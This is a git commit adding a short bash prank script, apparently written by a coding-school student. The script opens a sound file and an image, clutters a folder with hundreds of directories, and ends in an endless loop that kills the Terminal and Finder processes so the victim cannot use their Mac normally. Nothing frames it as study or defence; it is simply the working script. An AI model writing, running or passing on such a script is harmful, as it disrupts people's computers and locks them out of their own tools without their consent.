7a97fbc4abd4523ccda7da1e6aa75db8a61cadda
Khalid Slik <kslik@c1r6p3.1337.ma>
2022-12-03 11:07:40 +0100

    xx

---
+++ dhka.sh
@@ -0,0 +1,39 @@
+#!/bin/bash
+cp p.mp3 ../mm
+cp bana.png ../mm
+cd ../mm
+open p.mp3
+open bana.png
+mkdir a{1..20}
+mkdir b{1..20}
+mkdir c{1..20}
+mkdir d{1..20}
+mkdir e{1..20}
+mkdir f{1..20}
+mkdir j{1..20}
+mkdir h{1..20}
+mkdir i{1..20}
+mkdir j{1..20}
+mkdir k{1..20}
+mkdir l{1..20}
+mkdir m{1..20}
+mkdir n{1..20}
+mkdir o{1..20}
+mkdir p{1..20}
+mkdir q{1..20}
+mkdir r{1..20}
+mkdir s{1..20}
+mkdir t{1..20}
+mkdir u{1..20}
+mkdir v{1..20}
+mkdir w{1..20}
+mkdir x{1..20}
+mkdir y{1..20}
+mkdir wayli{1..20}
+mkdir arabussa{1..20}
+mkdir mtngaa{1..20}
+mkdir yalhbib{1..20}
+while (true) do
+killall terminal
+killall Finder
+done
